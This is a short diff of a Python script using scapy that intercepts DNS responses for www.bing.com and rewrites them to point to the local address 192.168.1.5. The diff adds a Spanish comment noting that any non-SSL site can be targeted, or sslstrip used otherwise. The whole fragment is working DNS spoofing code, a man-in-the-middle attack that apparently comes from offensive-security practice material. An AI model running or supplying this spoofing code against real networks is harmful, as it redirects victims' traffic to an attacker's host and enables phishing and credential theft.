@@ -13,7 +13,7 @@ def processPacket(packet):
     scapyPacket = scapy.IP(packet.get_payload())
     if scapyPacket.haslayer(scapy.DNSRR): # If it has a response, it must have a question
        question_Name = scapyPacket[scapy.DNSQR].qname
-       if "www.bing.com" in question_Name:
+       if "www.bing.com" in question_Name: # 'www.bing.com' puede ser cualquier pagina de web que no contenga seguridad ssl, en vez que desee utilizar sslstrip
            print("Spoofing Bing Website....")
            response_DNS = scapy.DNSRR(rrname=question_Name, rdata="192.168.1.5")
            scapyPacket[scapy.DNS].an = response_DNS
